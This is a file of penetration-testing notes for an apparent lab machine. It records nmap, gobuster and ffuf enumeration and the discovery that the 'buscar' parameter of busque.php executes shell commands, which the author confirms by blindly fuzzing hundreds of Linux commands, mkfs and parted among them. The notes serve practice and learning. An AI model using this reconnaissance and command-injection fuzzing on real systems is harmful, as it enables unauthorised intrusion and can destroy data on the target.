@@ -1,0 +1,620 @@
+Nmap scan
+---------
+
+Nmap scan report for 192.168.1.16 (or 192.168.8.199)
+Host is up (0.00086s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+80/tcp open  http    Apache httpd 2.4.18
+| http-ls: Volume /
+| SIZE  TIME              FILENAME
+| -     2021-06-10 18:05  site/
+|_
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Index of /
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+MAC Address: 08:00:27:F5:94:F1 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.16 - 4.6 (97%), Linux 3.2 - 4.9 (97%), Linux 4.4 (97%), Linux 3.13 (94%), Linux 3.13 - 3.16 (91%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (91%), Linux 4.10 (91%), Linux 5.1 (91%), Android 5.0 - 6.0.1 (Linux 3.4) (91%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 0.005 days (since Tue Sep  3 16:56:19 2024)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: 127.0.0.1; OS: Unix
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.87 ms 192.168.1.16
+
+
+Decisions:
+==========
+
+1. Since ftp is open, see if we can login with anonymous or usual username/passwords
+	- Anonymous login didn't work
+	- Tried user admin with pw: admin, admin123, password and didn't work
+	- probably better to move to website enumeration, we can come back if it's fruitless
+2. Enumerate website, which is probably the way to go
+	- The website is in /site directory, but lets first enumerate / dir.
+		- Looks like / doesn't have anything interesting, but we only enumerate it using
+		  2.3-medium list, so there could be more. Come back and do it with a bigger list
+		  if nothing else works.
+		  
+		===============================================================
+		Gobuster v3.6
+		by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+		===============================================================
+		[+] Url:                     http://192.168.1.16
+		[+] Method:                  GET
+		[+] Threads:                 10
+		[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+		[+] Negative Status codes:   404
+		[+] User Agent:              gobuster/3.6
+		[+] Timeout:                 10s
+		===============================================================
+		Starting gobuster in directory enumeration mode
+		===============================================================
+		/site                 (Status: 301) [Size: 311] [--> http://192.168.1.16/site/]
+		/server-status        (Status: 403) [Size: 277]
+		Progress: 220559 / 220560 (100.00%)
+	
+	- /site enum revealed /wordpress dir which has the same website that is in /site, but since
+	  relative paths don't work, none of the css and js scripts are not working.
+	  
+	===============================================================
+	Gobuster v3.6
+	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+	===============================================================
+	[+] Url:                     http://192.168.1.16/site
+	[+] Method:                  GET
+	[+] Threads:                 10
+	[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+	[+] Negative Status codes:   404
+	[+] User Agent:              gobuster/3.6
+	[+] Timeout:                 10s
+	===============================================================
+	Starting gobuster in directory enumeration mode
+	===============================================================
+	/assets               (Status: 301) [Size: 318] [--> http://192.168.1.16/site/assets/]
+	/css                  (Status: 301) [Size: 315] [--> http://192.168.1.16/site/css/]
+	/wordpress            (Status: 301) [Size: 321] [--> http://192.168.1.16/site/wordpress/]
+	/js                   (Status: 301) [Size: 314] [--> http://192.168.1.16/site/js/]
+	Progress: 220559 / 220560 (100.00%)
+	
+	- Interesting fact: buscue means "search" and buscar means "to look for" in spanish
+		- There is a nav link called "Buscue" that href to "/site/busque.php?buscar="
+		- This is probably the entrypoint. 
+	
+Decisions
+=========
+1. At this point we can enumerate files in either /site or /site/wordpress. Lets be thorough and 
+   first do /site.
+   	- /site fuzzing with usual wordlist file with extensions didn't reveal much.
+   	
+   	________________________________________________
+
+	 :: Method           : GET
+	 :: URL              : http://192.168.1.16/site/FUZZ
+	 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+	 :: Extensions       : .php .txt .html .htm .css .js 
+	 :: Follow redirects : false
+	 :: Calibration      : false
+	 :: Timeout          : 10
+	 :: Threads          : 40
+	 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+	 :: Filter           : Response size: 10190,277
+	________________________________________________
+
+	assets                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 8ms]
+	css                     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 14ms]
+	wordpress               [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 8ms]
+	js                      [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 7ms]
+	
+	Note: filtering for response sizes had to be included becasue there was a lot of garbage.
+	      If nothing else works maybe try fuzzing without them.
+	      
+	- I had an idea to fuzz using a spanish wordlist as the "search" is in spanish.
+	
+	________________________________________________
+
+	 :: Method           : GET
+	 :: URL              : http://192.168.1.16/site/FUZZ
+	 :: Wordlist         : FUZZ: /home/pacman/Documents/wordlists/spanish_words.txt
+	 :: Extensions       : .php .txt .html .htm .css .js 
+	 :: Follow redirects : false
+	 :: Calibration      : false
+	 :: Timeout          : 10
+	 :: Threads          : 40
+	 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+	 :: Filter           : Response size: 10190,277
+	________________________________________________
+
+	busque.php              [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 81ms]
+	:: Progress: [535080/535080] :: Job [1/1] :: 2777 req/sec :: Duration: [0:03:19] :: Errors: 0 ::
+
+	- This found the busque.php file but that we already knew, but nothing else. Maybe we should fuzz
+	  the query param with spanish as well.
+	  
+	________________________________________________
+
+	 :: Method           : GET
+	 :: URL              : http://192.168.8.199/site/busque.php?buscar=FUZZ
+	 :: Wordlist         : FUZZ: /home/pacman/Documents/wordlists/spanish_words.txt
+	 :: Extensions       : .php .txt .html .htm .css .js 
+	 :: Follow redirects : false
+	 :: Calibration      : false
+	 :: Timeout          : 10
+	 :: Threads          : 40
+	 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+	 :: Filter           : Response size: 1
+	________________________________________________
+
+	grog                    [Status: 200, Size: 9, Words: 2, Lines: 3, Duration: 6798ms]
+	id                      [Status: 200, Size: 55, Words: 3, Lines: 3, Duration: 231ms]
+	set                     [Status: 200, Size: 369, Words: 5, Lines: 18, Duration: 148ms]
+	ionice                  [Status: 200, Size: 14, Words: 3, Lines: 3, Duration: 185ms]
+	cal                     [Status: 200, Size: 189, Words: 99, Lines: 10, Duration: 166ms]
+	date                    [Status: 200, Size: 30, Words: 7, Lines: 3, Duration: 145ms]
+	vi                      [Status: 200, Size: 2600, Words: 1821, Lines: 5, Duration: 6724ms]
+	echo                    [Status: 200, Size: 2, Words: 1, Lines: 3, Duration: 170ms]
+	:: Progress: [535080/535080] :: Job [1/1] :: 291 req/sec :: Duration: [0:32:52] :: Errors: 3 ::
+	
+	- This looks interesting, i was able to run these urls and see that they seem to be executing the commands they represent
+	  and display the results. I wonder what else I can find using an english wordlist or a linux command wordlist. Lets start
+	  with the less interesting one first, english directory list.
+	  
+	  	- Looks like it's listing all the linux commands anyways. So I'd better run that instead.
+	  	
+	 - Tried to url-encode parameters, for ex: echo "hello", and it works. I can run commands as www-data. This is it! Good job dude :)
+	 
+	________________________________________________
+
+	 :: Method           : GET
+	 :: URL              : http://192.168.8.199/site/busque.php?buscar=FUZZ
+	 :: Wordlist         : FUZZ: /home/pacman/Documents/wordlists/linux-commands-merged.txt
+	 :: Extensions       : .php .txt .html .js 
+	 :: Follow redirects : false
+	 :: Calibration      : false
+	 :: Timeout          : 10
+	 :: Threads          : 40
+	 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+	 :: Filter           : Response size: 1
+	________________________________________________
+
+	echo                    [Status: 200, Size: 2, Words: 1, Lines: 3, Duration: 86ms]
+	export                  [Status: 200, Size: 372, Words: 10, Lines: 11, Duration: 108ms]
+	pwd                     [Status: 200, Size: 20, Words: 1, Lines: 3, Duration: 107ms]
+	set                     [Status: 200, Size: 370, Words: 5, Lines: 18, Duration: 152ms]
+	times                   [Status: 200, Size: 49, Words: 3, Lines: 4, Duration: 118ms]
+	umask                   [Status: 200, Size: 6, Words: 1, Lines: 3, Duration: 118ms]
+	ulimit                  [Status: 200, Size: 11, Words: 1, Lines: 3, Duration: 164ms]
+	ls                      [Status: 200, Size: 84, Words: 1, Lines: 11, Duration: 381ms]
+	echo                    [Status: 200, Size: 2, Words: 1, Lines: 3, Duration: 157ms]
+	export                  [Status: 200, Size: 372, Words: 10, Lines: 11, Duration: 221ms]
+	pwd                     [Status: 200, Size: 20, Words: 1, Lines: 3, Duration: 165ms]
+	set                     [Status: 200, Size: 370, Words: 5, Lines: 18, Duration: 196ms]
+	times                   [Status: 200, Size: 49, Words: 3, Lines: 4, Duration: 180ms]
+	ulimit                  [Status: 200, Size: 11, Words: 1, Lines: 3, Duration: 196ms]
+	umask                   [Status: 200, Size: 6, Words: 1, Lines: 3, Duration: 197ms]
+	e4defrag                [Status: 200, Size: 106, Words: 13, Lines: 4, Duration: 495ms]
+	update-usbids           [Status: 200, Size: 50, Words: 4, Lines: 3, Duration: 718ms]
+	nologin                 [Status: 200, Size: 42, Words: 6, Lines: 3, Duration: 275ms]
+	phpenmod                [Status: 200, Size: 91, Words: 14, Lines: 3, Duration: 532ms]
+	phpquery                [Status: 200, Size: 100, Words: 25, Lines: 3, Duration: 1340ms]
+	biosdecode              [Status: 200, Size: 18, Words: 3, Lines: 3, Duration: 386ms]
+	update-catalog          [Status: 200, Size: 77, Words: 13, Lines: 3, Duration: 936ms]
+	phpdismod               [Status: 200, Size: 92, Words: 14, Lines: 3, Duration: 621ms]
+	grub-set-default        [Status: 200, Size: 280, Words: 32, Lines: 8, Duration: 299ms]
+	vipw                    [Status: 200, Size: 32, Words: 4, Lines: 3, Duration: 355ms]
+	try-from                [Status: 200, Size: 243, Words: 36, Lines: 10, Duration: 331ms]
+	a2ensite                [Status: 200, Size: 95, Words: 13, Lines: 4, Duration: 3800ms]
+	a2dissite               [Status: 200, Size: 84, Words: 12, Lines: 4, Duration: 4479ms]
+	vigr                    [Status: 200, Size: 31, Words: 4, Lines: 3, Duration: 278ms]
+	a2enmod                 [Status: 200, Size: 1144, Words: 118, Lines: 4, Duration: 4244ms]
+	arp                     [Status: 200, Size: 248, Words: 124, Lines: 5, Duration: 294ms]
+	a2query                 [Status: 200, Size: 746, Words: 195, Lines: 15, Duration: 9293ms]
+	a2enconf                [Status: 200, Size: 148, Words: 16, Lines: 4, Duration: 3479ms]
+	invoke-rc.d             [Status: 200, Size: 1319, Words: 262, Lines: 40, Duration: 495ms]
+	a2disconf               [Status: 200, Size: 149, Words: 16, Lines: 4, Duration: 3535ms]
+	a2dismod                [Status: 200, Size: 245, Words: 30, Lines: 4, Duration: 3915ms]
+	dmidecode               [Status: 200, Size: 52, Words: 7, Lines: 4, Duration: 420ms]
+	rtcwake                 [Status: 200, Size: 36, Words: 6, Lines: 3, Duration: 202ms]
+	grub-reboot             [Status: 200, Size: 865, Words: 172, Lines: 16, Duration: 4590ms]
+	add-shell               [Status: 200, Size: 54, Words: 5, Lines: 3, Duration: 380ms]
+	validlocale             [Status: 200, Size: 39, Words: 3, Lines: 3, Duration: 1652ms]
+	vpddecode               [Status: 200, Size: 17, Words: 3, Lines: 3, Duration: 246ms]
+	tzconfig                [Status: 200, Size: 83, Words: 10, Lines: 4, Duration: 418ms]
+	neqn                    [Status: 200, Size: 501, Words: 73, Lines: 21, Duration: 658ms]
+	env                     [Status: 200, Size: 291, Words: 1, Lines: 11, Duration: 214ms]
+	mcookie                 [Status: 200, Size: 34, Words: 1, Lines: 3, Duration: 462ms]
+	dbus-uuidgen            [Status: 200, Size: 34, Words: 1, Lines: 3, Duration: 371ms]
+	pinky                   [Status: 200, Size: 66, Words: 40, Lines: 3, Duration: 397ms]
+	uptime                  [Status: 200, Size: 67, Words: 14, Lines: 3, Duration: 551ms]
+	screen                  [Status: 200, Size: 35, Words: 6, Lines: 3, Duration: 538ms]
+	md5sum.textutils        [Status: 200, Size: 37, Words: 3, Lines: 3, Duration: 378ms]
+	manpath                 [Status: 200, Size: 52, Words: 1, Lines: 3, Duration: 556ms]
+	ncal                    [Status: 200, Size: 175, Words: 85, Lines: 10, Duration: 357ms]
+	systemd-cgtop           [Status: 200, Size: 3771, Words: 2591, Lines: 31, Duration: 850ms]
+	vimdiff                 [Status: 200, Size: 153, Words: 11, Lines: 5, Duration: 8789ms]
+	myisamchk               [Status: 200, Size: 6763, Words: 1873, Lines: 134, Duration: 1749ms]
+	zipgrep                 [Status: 200, Size: 133, Words: 19, Lines: 4, Duration: 246ms]
+	telnet.netkit           [Status: 200, Size: 16, Words: 2, Lines: 2, Duration: 491ms]
+	lessfile                [Status: 200, Size: 85, Words: 6, Lines: 4, Duration: 608ms]
+	apt                     [Status: 200, Size: 1220, Words: 204, Lines: 29, Duration: 1561ms]
+	pod2html                [Status: 200, Size: 359, Words: 18, Lines: 21, Duration: 6003ms]
+	rview                   [Status: 200, Size: 2600, Words: 1821, Lines: 5, Duration: 5621ms]
+	runcon                  [Status: 200, Size: 13, Words: 1, Lines: 4, Duration: 502ms]
+	mysqldump               [Status: 200, Size: 204, Words: 29, Lines: 6, Duration: 2115ms]
+	cpp-5                   [Status: 200, Size: 129, Words: 17, Lines: 8, Duration: 3834ms]
+	xargs                   [Status: 200, Size: 2, Words: 1, Lines: 3, Duration: 456ms]
+	apropos                 [Status: 200, Size: 15, Words: 2, Lines: 3, Duration: 228ms]
+	mysqlimport             [Status: 200, Size: 7595, Words: 2497, Lines: 149, Duration: 2116ms]
+	du                      [Status: 200, Size: 72, Words: 1, Lines: 8, Duration: 461ms]
+	grub-mkimage            [Status: 200, Size: 50, Words: 8, Lines: 3, Duration: 424ms]
+	cal                     [Status: 200, Size: 189, Words: 99, Lines: 10, Duration: 195ms]
+	getent                  [Status: 200, Size: 63, Words: 9, Lines: 3, Duration: 239ms]
+	perror                  [Status: 200, Size: 1053, Words: 215, Lines: 25, Duration: 1957ms]
+	dbus-cleanup-sockets    [Status: 200, Size: 78, Words: 16, Lines: 3, Duration: 280ms]
+	od                      [Status: 200, Size: 9, Words: 1, Lines: 3, Duration: 251ms]
+	ipcs                    [Status: 200, Size: 607, Words: 315, Lines: 16, Duration: 234ms]
+	apt-ftparchive          [Status: 200, Size: 1595, Words: 275, Lines: 41, Duration: 812ms]
+	mysql_install_db        [Status: 200, Size: 112, Words: 12, Lines: 3, Duration: 1834ms]
+	w.procps                [Status: 200, Size: 134, Words: 48, Lines: 4, Duration: 1069ms]
+	lscpu                   [Status: 200, Size: 1067, Words: 348, Lines: 26, Duration: 435ms]
+	routel                  [Status: 200, Size: 1307, Words: 681, Lines: 18, Duration: 977ms]
+	sprof                   [Status: 200, Size: 61, Words: 9, Lines: 3, Duration: 602ms]
+	shasum                  [Status: 200, Size: 45, Words: 3, Lines: 3, Duration: 4566ms]
+	vimtutor                [Status: 200, Size: 1576, Words: 223, Lines: 10, Duration: 7271ms]
+	codepage                [Status: 200, Size: 382, Words: 64, Lines: 12, Duration: 293ms]
+	apt-config              [Status: 200, Size: 637, Words: 81, Lines: 17, Duration: 850ms]
+	script                  [Status: 200, Size: 72, Words: 10, Lines: 5, Duration: 627ms]
+	prlimit                 [Status: 200, Size: 1203, Words: 509, Lines: 19, Duration: 256ms]
+	c2ph                    [Status: 200, Size: 5, Words: 1, Lines: 4, Duration: 8890ms]
+	grub-kbdcomp            [Status: 200, Size: 361, Words: 74, Lines: 12, Duration: 3520ms]
+	lslogins                [Status: 200, Size: 2227, Words: 1567, Lines: 35, Duration: 2608ms]
+	perlthanks              [Status: 200, Size: 97, Words: 16, Lines: 5, Duration: 9529ms]
+	w                       [Status: 200, Size: 134, Words: 48, Lines: 4, Duration: 1095ms]
+	myisampack              [Status: 200, Size: 2459, Words: 625, Lines: 52, Duration: 1982ms]
+	mysqlcheck              [Status: 200, Size: 9525, Words: 3120, Lines: 179, Duration: 1957ms]
+	pydoc3                  [Status: 200, Size: 1166, Words: 242, Lines: 29, Duration: 7795ms]
+	deb-systemd-helper      [Status: 200, Size: 178, Words: 23, Lines: 4, Duration: 6897ms]
+	hostid                  [Status: 200, Size: 10, Words: 1, Lines: 3, Duration: 771ms]
+	ssh-agent               [Status: 200, Size: 137, Words: 8, Lines: 5, Duration: 1845ms]
+	x86_64-linux-gnu-cpp-5  [Status: 200, Size: 129, Words: 17, Lines: 8, Duration: 3497ms]
+	pkaction                [Status: 200, Size: 2304, Words: 1, Lines: 57, Duration: 3253ms]
+	rvim                    [Status: 200, Size: 2605, Words: 1826, Lines: 5, Duration: 9658ms]
+	lsipc                   [Status: 200, Size: 1080, Words: 524, Lines: 15, Duration: 745ms]
+	hostnamectl             [Status: 200, Size: 327, Words: 84, Lines: 11, Duration: 558ms]
+	sha384sum               [Status: 200, Size: 101, Words: 3, Lines: 3, Duration: 364ms]
+	pdb3.5                  [Status: 200, Size: 433, Words: 70, Lines: 13, Duration: 8401ms]
+	lsof                    [Status: 200, Size: 349003, Words: 148048, Lines: 3030, Duration: 5149ms]
+	apt-cdrom               [Status: 200, Size: 659, Words: 89, Lines: 18, Duration: 1796ms]
+	find                    [Status: 200, Size: 357, Words: 1, Lines: 23, Duration: 531ms]
+	py3compile              [Status: 200, Size: 93, Words: 16, Lines: 5, Duration: 8166ms]
+	vim.tiny                [Status: 200, Size: 2496, Words: 1816, Lines: 4, Duration: 2684ms]
+	pydoc3.5                [Status: 200, Size: 1166, Words: 242, Lines: 29, Duration: 7433ms]
+	vmstat                  [Status: 200, Size: 244, Words: 76, Lines: 5, Duration: 724ms]
+	geqn                    [Status: 200, Size: 494, Words: 73, Lines: 21, Duration: 1489ms]
+	systemd-analyze         [Status: 200, Size: 80, Words: 12, Lines: 3, Duration: 811ms]
+	pic                     [Status: 200, Size: 41, Words: 9, Lines: 5, Duration: 347ms]
+	ionice                  [Status: 200, Size: 14, Words: 3, Lines: 3, Duration: 404ms]
+	iptables-xml            [Status: 200, Size: 50, Words: 2, Lines: 4, Duration: 2464ms]
+	passwd                  [Status: 200, Size: 33, Words: 4, Lines: 3, Duration: 990ms]
+	unicode_stop            [Status: 200, Size: 35, Words: 6, Lines: 3, Duration: 966ms]
+	x86_64-linux-gnu-cpp    [Status: 200, Size: 129, Words: 17, Lines: 8, Duration: 2815ms]
+	sha512sum               [Status: 200, Size: 133, Words: 3, Lines: 3, Duration: 294ms]
+	busctl                  [Status: 200, Size: 2643, Words: 1604, Lines: 21, Duration: 1216ms]
+	wc                      [Status: 200, Size: 25, Words: 21, Lines: 3, Duration: 902ms]
+	apt-extracttemplates    [Status: 200, Size: 593, Words: 69, Lines: 14, Duration: 2937ms]
+	git-upload-archive      [Status: 200, Size: 100, Words: 9, Lines: 4, Duration: 2025ms]
+	mysqloptimize           [Status: 200, Size: 9537, Words: 3120, Lines: 179, Duration: 2269ms]
+	sum                     [Status: 200, Size: 13, Words: 6, Lines: 3, Duration: 289ms]
+	mysqladmin              [Status: 200, Size: 7293, Words: 2223, Lines: 148, Duration: 2784ms]
+	mysqlanalyze            [Status: 200, Size: 9533, Words: 3120, Lines: 179, Duration: 2115ms]
+	id                      [Status: 200, Size: 55, Words: 3, Lines: 3, Duration: 511ms]
+	sha1sum                 [Status: 200, Size: 45, Words: 3, Lines: 3, Duration: 685ms]
+	mysqlrepair             [Status: 200, Size: 9529, Words: 3120, Lines: 179, Duration: 1834ms]
+	zipinfo                 [Status: 200, Size: 742, Words: 172, Lines: 15, Duration: 1138ms]
+	systemd-delta           [Status: 200, Size: 286, Words: 15, Lines: 6, Duration: 7449ms]
+	my_print_defaults       [Status: 200, Size: 2485, Words: 741, Lines: 54, Duration: 1930ms]
+	xz                      [Status: 200, Size: 33, Words: 1, Lines: 2, Duration: 4198ms]
+	tzselect                [Status: 200, Size: 2, Words: 1, Lines: 3, Duration: 7359ms]
+	systemd-cgls            [Status: 200, Size: 12257, Words: 1946, Lines: 352, Duration: 2167ms]
+	mysql_config_editor     [Status: 200, Size: 1331, Words: 321, Lines: 30, Duration: 1525ms]
+	eqn                     [Status: 200, Size: 492, Words: 73, Lines: 21, Duration: 600ms]
+	unzipsfx                [Status: 200, Size: 72, Words: 9, Lines: 3, Duration: 456ms]
+	apt-cache               [Status: 200, Size: 1192, Words: 176, Lines: 27, Duration: 2255ms]
+	view                    [Status: 200, Size: 2600, Words: 1821, Lines: 5, Duration: 6428ms]
+	apt-get                 [Status: 200, Size: 1520, Words: 261, Lines: 35, Duration: 544ms]
+	unzip                   [Status: 200, Size: 1661, Words: 356, Lines: 28, Duration: 368ms]
+	git                     [Status: 200, Size: 2051, Words: 470, Lines: 44, Duration: 637ms]
+	whatis                  [Status: 200, Size: 14, Words: 2, Lines: 3, Duration: 500ms]
+	innochecksum            [Status: 200, Size: 2222, Words: 671, Lines: 47, Duration: 1862ms]
+	vim.basic               [Status: 200, Size: 2605, Words: 1822, Lines: 5, Duration: 6571ms]
+	free                    [Status: 200, Size: 205, Words: 101, Lines: 5, Duration: 527ms]
+	mysqlbinlog             [Status: 200, Size: 12155, Words: 4387, Lines: 221, Duration: 2074ms]
+	whoami                  [Status: 200, Size: 10, Words: 1, Lines: 3, Duration: 446ms]
+	grog                    [Status: 200, Size: 9, Words: 2, Lines: 3, Duration: 2788ms]
+	localedef               [Status: 200, Size: 69, Words: 9, Lines: 3, Duration: 379ms]
+	cksum                   [Status: 200, Size: 14, Words: 2, Lines: 3, Duration: 374ms]
+	pstree                  [Status: 200, Size: 1965, Words: 681, Lines: 54, Duration: 2020ms]
+	tbl                     [Status: 200, Size: 84, Words: 16, Lines: 6, Duration: 642ms]
+	locale                  [Status: 200, Size: 211, Words: 1, Lines: 17, Duration: 266ms]
+	pkcheck                 [Status: 200, Size: 4416, Words: 1104, Lines: 105, Duration: 7642ms]
+	mk_modmap               [Status: 200, Size: 81, Words: 13, Lines: 4, Duration: 780ms]
+	apt-sortpkgs            [Status: 200, Size: 588, Words: 75, Lines: 14, Duration: 3502ms]
+	lsattr                  [Status: 200, Size: 255, Words: 10, Lines: 11, Duration: 508ms]
+	lastlog                 [Status: 200, Size: 2090, Words: 1255, Lines: 35, Duration: 1798ms]
+	lorder                  [Status: 200, Size: 24, Words: 4, Lines: 3, Duration: 452ms]
+	xdg-user-dir            [Status: 200, Size: 2, Words: 1, Lines: 3, Duration: 709ms]
+	tty                     [Status: 200, Size: 11, Words: 3, Lines: 3, Duration: 221ms]
+	printenv                [Status: 200, Size: 291, Words: 1, Lines: 11, Duration: 346ms]
+	openssl                 [Status: 200, Size: 10, Words: 2, Lines: 2, Duration: 4174ms]
+	localectl               [Status: 200, Size: 468, Words: 212, Lines: 16, Duration: 1479ms]
+	nslookup                [Status: 200, Size: 2, Words: 1, Lines: 3, Duration: 6199ms]
+	sha224sum               [Status: 200, Size: 61, Words: 3, Lines: 3, Duration: 632ms]
+	lesspipe                [Status: 200, Size: 87, Words: 7, Lines: 4, Duration: 922ms]
+	gpic                    [Status: 200, Size: 41, Words: 9, Lines: 5, Duration: 604ms]
+	timedatectl             [Status: 200, Size: 248, Words: 53, Lines: 9, Duration: 634ms]
+	myisam_ftdump           [Status: 200, Size: 617, Words: 148, Lines: 15, Duration: 2227ms]
+	preconv                 [Status: 200, Size: 9, Words: 3, Lines: 3, Duration: 477ms]
+	telnet                  [Status: 200, Size: 9, Words: 2, Lines: 2, Duration: 546ms]
+	nice                    [Status: 200, Size: 3, Words: 1, Lines: 3, Duration: 395ms]
+	nstat                   [Status: 200, Size: 2154, Words: 1255, Lines: 42, Duration: 971ms]
+	sha256sum               [Status: 200, Size: 69, Words: 3, Lines: 3, Duration: 375ms]
+	vi                      [Status: 200, Size: 2600, Words: 1821, Lines: 5, Duration: 7321ms]
+	arch                    [Status: 200, Size: 8, Words: 1, Lines: 3, Duration: 371ms]
+	line                    [Status: 200, Size: 2, Words: 1, Lines: 3, Duration: 519ms]
+	usb-devices             [Status: 200, Size: 386, Words: 60, Lines: 11, Duration: 7996ms]
+	mysqld_multi            [Status: 200, Size: 4133, Words: 1001, Lines: 76, Duration: 8886ms]
+	uuidgen                 [Status: 200, Size: 38, Words: 1, Lines: 3, Duration: 776ms]
+	apt-mark                [Status: 200, Size: 1032, Words: 153, Lines: 24, Duration: 3863ms]
+	lslocks                 [Status: 200, Size: 6750, Words: 3224, Lines: 129, Duration: 1485ms]
+	md5sum                  [Status: 200, Size: 37, Words: 3, Lines: 3, Duration: 398ms]
+	apt-key                 [Status: 200, Size: 717, Words: 204, Lines: 17, Duration: 6211ms]
+	mandb                   [Status: 200, Size: 140, Words: 20, Lines: 6, Duration: 3256ms]
+	nproc                   [Status: 200, Size: 3, Words: 1, Lines: 3, Duration: 357ms]
+	lspgpot                 [Status: 200, Size: 115, Words: 18, Lines: 6, Duration: 3451ms]
+	mysql_secure_installation [Status: 200, Size: 111, Words: 13, Lines: 6, Duration: 5368ms]
+	newgrp                  [Status: 200, Size: 42, Words: 6, Lines: 3, Duration: 1505ms]
+	pstree.x11              [Status: 200, Size: 2057, Words: 714, Lines: 57, Duration: 3516ms]
+	lspci                   [Status: 200, Size: 720, Words: 84, Lines: 11, Duration: 5834ms]
+	gencat                  [Status: 200, Size: 37, Words: 1, Lines: 2, Duration: 1202ms]
+	groups                  [Status: 200, Size: 10, Words: 1, Lines: 3, Duration: 1110ms]
+	systemd-path            [Status: 200, Size: 1375, Words: 39, Lines: 40, Duration: 930ms]
+	resolveip               [Status: 200, Size: 709, Words: 139, Lines: 18, Duration: 3188ms]
+	lzma                    [Status: 200, Size: 24, Words: 1, Lines: 2, Duration: 5763ms]
+	systemd-detect-virt     [Status: 200, Size: 8, Words: 1, Lines: 3, Duration: 687ms]
+	gtbl                    [Status: 200, Size: 84, Words: 16, Lines: 6, Duration: 580ms]
+	last                    [Status: 200, Size: 3764, Words: 1177, Lines: 55, Duration: 1640ms]
+	grub-mkpasswd-pbkdf2    [Status: 200, Size: 17, Words: 3, Lines: 2, Duration: 1036ms]
+	cpp                     [Status: 200, Size: 129, Words: 17, Lines: 8, Duration: 7778ms]
+	soelim                  [Status: 200, Size: 13, Words: 3, Lines: 3, Duration: 857ms]
+	rtacct                  [Status: 200, Size: 121, Words: 52, Lines: 5, Duration: 337ms]
+	fsck.nfs                [Status: 200, Size: 20, Words: 4, Lines: 3, Duration: 1058ms]
+	ipmaddr                 [Status: 200, Size: 212, Words: 16, Lines: 14, Duration: 719ms]
+	mkfs.msdos              [Status: 200, Size: 30, Words: 3, Lines: 3, Duration: 192ms]
+	debugfs                 [Status: 200, Size: 11, Words: 3, Lines: 2, Duration: 2467ms]
+	vim                     [Status: 200, Size: 2605, Words: 1822, Lines: 5, Duration: 9074ms]
+	vconfig                 [Status: 200, Size: 1265, Words: 327, Lines: 25, Duration: 619ms]
+	blkid                   [Status: 200, Size: 181, Words: 7, Lines: 4, Duration: 1121ms]
+	shadowconfig            [Status: 200, Size: 36, Words: 5, Lines: 3, Duration: 692ms]
+	ntfslabel               [Status: 200, Size: 501, Words: 125, Lines: 16, Duration: 855ms]
+	mkntfs                  [Status: 200, Size: 1503, Words: 501, Lines: 36, Duration: 368ms]
+	mkfs.fat                [Status: 200, Size: 30, Words: 3, Lines: 3, Duration: 464ms]
+	lvmconfig               [Status: 200, Size: 2449, Words: 12, Lines: 117, Duration: 676ms]
+	fsck                    [Status: 200, Size: 51, Words: 6, Lines: 4, Duration: 731ms]
+	lvmdiskscan             [Status: 200, Size: 87, Words: 19, Lines: 6, Duration: 1479ms]
+	ntfsresize              [Status: 200, Size: 1325, Words: 364, Lines: 30, Duration: 820ms]
+	lvm                     [Status: 200, Size: 7, Words: 2, Lines: 3, Duration: 1219ms]
+	logsave                 [Status: 200, Size: 39, Words: 5, Lines: 3, Duration: 840ms]
+	route                   [Status: 200, Size: 263, Words: 119, Lines: 6, Duration: 882ms]
+	installkernel           [Status: 200, Size: 65, Words: 6, Lines: 3, Duration: 918ms]
+	fsadm                   [Status: 200, Size: 865, Words: 220, Lines: 22, Duration: 2249ms]
+	mkdosfs                 [Status: 200, Size: 30, Words: 3, Lines: 3, Duration: 1271ms]
+	tune2fs                 [Status: 200, Size: 31, Words: 3, Lines: 3, Duration: 1083ms]
+	mkfs.ntfs               [Status: 200, Size: 1503, Words: 501, Lines: 36, Duration: 1130ms]
+	parted                  [Status: 200, Size: 77, Words: 75, Lines: 2, Duration: 897ms]
+	cryptsetup-reencrypt    [Status: 200, Size: 72, Words: 11, Lines: 3, Duration: 966ms]
+	swapon                  [Status: 200, Size: 77, Words: 24, Lines: 4, Duration: 602ms]
+	lvmconf                 [Status: 200, Size: 474, Words: 39, Lines: 16, Duration: 1208ms]
+	ifconfig                [Status: 200, Size: 912, Words: 229, Lines: 20, Duration: 482ms]
+	iw                      [Status: 200, Size: 4415, Words: 497, Lines: 91, Duration: 400ms]
+	runlevel                [Status: 200, Size: 5, Words: 2, Lines: 3, Duration: 705ms]
+	ntfsundelete            [Status: 200, Size: 1206, Words: 351, Lines: 31, Duration: 545ms]
+	chcpu                   [Status: 200, Size: 421, Words: 128, Lines: 13, Duration: 461ms]
+	mkfs.vfat               [Status: 200, Size: 30, Words: 3, Lines: 3, Duration: 721ms]
+	lsmod                   [Status: 200, Size: 4555, Words: 1705, Lines: 107, Duration: 654ms]
+	ntfscluster             [Status: 200, Size: 670, Words: 171, Lines: 20, Duration: 392ms]
